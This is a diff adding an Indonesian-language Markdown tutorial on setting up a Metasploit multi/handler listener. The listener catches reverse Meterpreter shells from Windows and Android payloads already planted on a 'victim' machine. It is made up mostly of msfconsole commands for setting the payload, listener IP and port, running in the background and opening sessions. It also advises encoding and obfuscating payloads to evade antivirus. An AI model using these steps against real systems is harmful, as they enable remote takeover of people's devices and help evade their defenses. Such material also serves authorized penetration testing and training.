@@ -1,0 +1,123 @@
+# Membuat Listener dengan `multi/handler`
+
+## A. Apa itu `exploit/multi/handler`?
+
+`multi/handler` adalah modul di Metasploit yang berfungsi sebagai listener untuk menerima koneksi balik (reverse connection) dari payload yang sudah ditanamkan ke target.
+
+Modul ini tidak mengeksploitasi, tapi hanya mendengarkan dan menangani koneksi masuk dari payload yang berhasil dijalankan di sistem korban.
+
+## B. Langkah-Langkah Membuat Listener
+
+### 1. Jalankan Metasploit Framework
+
+```
+msfconsole
+```
+
+### 2. Pilih Modul multi/handler
+
+```
+use exploit/multi/handler
+```
+
+### 3. Tentukan Payload yang Sesuai
+
+Contoh jika payload yang dikirim adalah `windows/meterpreter/reverse_tcp`:
+
+```
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+```
+
+### 4. Atur IP dan Port Listener
+
+```
+set LHOST 192.168.1.100
+set LPORT 4444
+```
+
+- **LHOST**: IP attacker (listener)
+- **LPORT**: Port tempat menerima koneksi
+
+### 5. (Opsional) Atur Auto-Run Script setelah koneksi
+
+```
+set AutoRunScript post/windows/manage/migrate
+```
+
+### 6. Jalankan Listener
+
+```
+run
+```
+
+Atau bisa juga:
+
+```
+exploit
+```
+
+## C. Contoh Lengkap: Listener untuk Payload Windows
+
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 4444
+exploit
+```
+
+## D. Contoh Listener untuk Payload Android
+
+```
+use exploit/multi/handler
+set PAYLOAD android/meterpreter/reverse_tcp
+set LHOST 192.168.1.100
+set LPORT 1234
+exploit
+```
+
+## E. Mode Background Listener
+
+Kalau ingin listener tetap berjalan di background:
+
+```
+exploit -j
+```
+
+- `-j`: Jalankan sebagai job (background)
+- `-z`: Tidak membuka sesi interaktif secara langsung
+
+## F. Melihat Job Listener Aktif
+
+```
+jobs
+```
+
+## G. Interaksi dengan Session Meterpreter
+
+Saat target berhasil terhubung, session akan muncul:
+
+```
+sessions
+```
+
+Untuk masuk ke sesi:
+
+```
+sessions -i 1
+```
+
+## H. Tips Keamanan
+
+- Gunakan IP yang benar-benar bisa diakses korban (public IP/VPN/local sesuai skenario).
+- Jangan gunakan port yang umum terblokir firewall.
+- Gunakan encoding dan obfuscation pada payload untuk menghindari AV.
+
+## I. Troubleshooting
+
+| Masalah | Penyebab Umum | Solusi |
+|:--:|:--:|:--:|
+| Tidak ada koneksi masuk | IP/Port salah | Pastikan LHOST/LPORT sesuai|
+| Payload terdeteksi AV | Payload tidak diencode | Gunakan -e encoder di msfvenom |
+| Listener tidak merespons | Port diblokir | Ganti port atau periksa firewall |
